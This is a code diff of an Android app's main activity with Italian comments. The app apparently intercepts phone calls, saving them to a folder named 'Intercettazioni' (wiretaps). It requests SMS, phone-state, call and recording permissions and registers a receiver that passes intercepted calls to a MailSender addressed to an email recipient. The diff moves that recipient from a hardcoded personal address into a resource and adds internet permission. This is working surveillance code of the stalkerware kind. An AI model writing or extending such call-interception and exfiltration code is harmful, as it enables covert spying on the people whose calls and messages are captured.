@@ -6,8 +6,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
-import android.media.MediaPlayer;
-import android.media.MediaRecorder;
 import android.net.ConnectivityManager;
 import android.os.Bundle;
 import android.os.Environment;
@@ -17,7 +15,9 @@ import android.view.ViewGroup;
 import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.TextView;
+
 import java.io.File;
+
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 
@@ -27,11 +27,9 @@ public class MainActivity extends AppCompatActivity {
     private static final int REQUEST_RECORD_AUDIO_PERMISSION = 200;
     private static String fileName = Environment.getExternalStorageDirectory().getAbsolutePath()+"/Intercettazioni";
     private RecordButton recordButton = null;
-    private MediaRecorder recorder = null;
     private PlayButton playButton = null;
-    private MediaPlayer player = null;
     private CallRecorder cr = null;
-    private String [] permissions = {"android.permission.READ_PHONE_NUMBERS", "android.permission.READ_SMS", "android.permission.READ_PHONE_STATE", "android.permission.RECORD_AUDIO", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.PROCESS_OUTGOING_CALLS", "android.permission.ACCESS_NETWORK_STATE"};
+    private String [] permissions = {"android.permission.READ_PHONE_NUMBERS", "android.permission.READ_SMS", "android.permission.READ_PHONE_STATE", "android.permission.RECORD_AUDIO", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.PROCESS_OUTGOING_CALLS", "android.permission.ACCESS_NETWORK_STATE", "android.permission.INTERNET"};
 
     @SuppressLint("AppCompatCustomView")
     class RecordButton extends Button {
@@ -112,6 +110,7 @@ public class MainActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(this, permissions, REQUEST_RECORD_AUDIO_PERMISSION);
             tx.setText("Per favore riavvia l'applicazione per utilizzare tutte le funzioni!");
         }
+
         if (checkPermission(new String[]{"android.permission.READ_PHONE_NUMBERS", "android.permission.READ_SMS", "android.permission.READ_PHONE_STATE"})){
             TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
             File dir = new File(fileName);
@@ -123,14 +122,14 @@ public class MainActivity extends AppCompatActivity {
                 e.printStackTrace();
             }
             String phoneNumber = tMgr.getLine1Number();
-            //INTERCETTA LE CHIAMATE IN USCITA
-            MailSender mail = new MailSender(this, "vincenzosantoro.h@hotmail.it");
+            //INTERCETTA LE CHIAMATE
+            MailSender mail = new MailSender(this, getResources().getString(R.string.recipients));
             BroadcastReceiver br = new OutgoingCallReceiver(cr, mail, phoneNumber);
             IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
             filter.addAction(Intent.ACTION_NEW_OUTGOING_CALL);
             filter.addAction(TelephonyManager.ACTION_PHONE_STATE_CHANGED);
             this.registerReceiver(br, filter);
-            //FINE INTERCETTA CHIAMATE IN USCITA
+            //FINE INTERCETTA CHIAMATE
 
             String operator = tMgr.getNetworkOperatorName();
             tx.setText("Il tuo numero di telefono è: \n" + phoneNumber + "\n il tuo operatore è: \n" + operator);
